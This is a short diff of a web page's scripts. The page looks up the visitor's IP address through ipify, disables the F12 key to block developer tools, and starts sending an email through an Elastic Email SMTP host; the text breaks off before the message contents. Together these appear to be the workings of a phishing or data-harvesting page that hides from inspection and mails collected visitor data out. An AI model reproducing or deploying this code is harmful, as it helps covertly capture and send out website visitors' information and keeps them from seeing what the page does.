@@ -13,13 +13,14 @@
     <script type="application/javascript" src="https://api.ipify.org?format=jsonp&amp;
 callback=getIP"></script>
   <script type="text/javascript"  language="javascript">
-   function keydown()
-{
-if(event.keyCode == 123){
-event.keyCode = null;
-return false;
-}
+   function keydown(){
+     if(event.keyCode == 123){
+     event.keyCode = null;
+     return false;
+     }
 };
+</script>
+<script type="text/javascript">
 window.document.onkeydown = keydown;
     Email.send({
     Host : "smtp.elasticemail.com",
